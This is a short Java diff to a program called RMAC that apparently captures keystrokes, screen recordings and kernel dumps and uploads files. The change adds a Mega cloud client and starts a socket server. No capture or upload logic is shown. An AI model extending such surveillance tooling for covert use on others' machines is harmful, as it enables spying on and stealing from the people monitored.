@@ -7,6 +7,7 @@ import com.rmac.core.FileUploader;
 import com.rmac.core.KernelDump;
 import com.rmac.core.KeyLog;
 import com.rmac.core.KeyRecorder;
+import com.rmac.core.MegaClient;
 import com.rmac.core.ScreenRecorder;
 import com.rmac.core.ScriptFiles;
 import com.rmac.core.Service;
@@ -73,6 +74,7 @@ public class RMAC {
   public static RandomAccessFile randomAccessFile;
 
   public static FileSystem fs = new FileSystem();
+  public static MegaClient mega = new MegaClient();
 
   public static void main(String[] args) throws InstantiationException, IllegalAccessException {
     new RMAC().start(args);
@@ -117,6 +119,7 @@ public class RMAC {
     NATIVE_POSSIBLE = this.copyDLL();
     // Create SocketServer and start listening for connection
     ipcInterface = (SocketServer) this.getInstance(SocketServer.class);
+    ipcInterface.start();
     // Initialize FileUploader
     uploader = (FileUploader) this.getInstance(FileUploader.class);
     // Initialize Archiver
